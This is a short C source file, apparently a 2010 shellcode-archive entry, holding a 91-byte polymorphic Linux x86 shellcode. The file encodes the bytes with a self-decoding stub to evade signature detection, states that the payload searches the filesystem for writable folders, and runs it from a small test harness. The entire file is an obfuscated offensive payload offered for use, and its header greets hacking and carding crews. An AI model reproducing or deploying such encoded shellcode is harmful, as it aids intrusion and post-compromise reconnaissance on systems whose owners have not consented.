/*
Title  : Find all writeable folder in filesystem linux polymorphic shellcode .
Name   : 91 bytes Find all writeable folder in filesystem linux polymorphic shellcode .
Date   : Sat Jun  17 21:27:03 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org), loneferret (offensive-security.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/

#include <stdio.h>

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35\x80\xe9\x01"
		   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5"
		   "\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87"
		   "\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02"
		   "\xb5\x96\x1d\x29\x34\x34\x34\x9b\x9e\xa3\x99\x55\x64\x55\x62"
		   "\xa9\xae\xa5\x9a\x55\x99\x55\x62\xa5\x9a\xa7\xa2\x55\x6c\x6c"
		   "\x6c";

int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}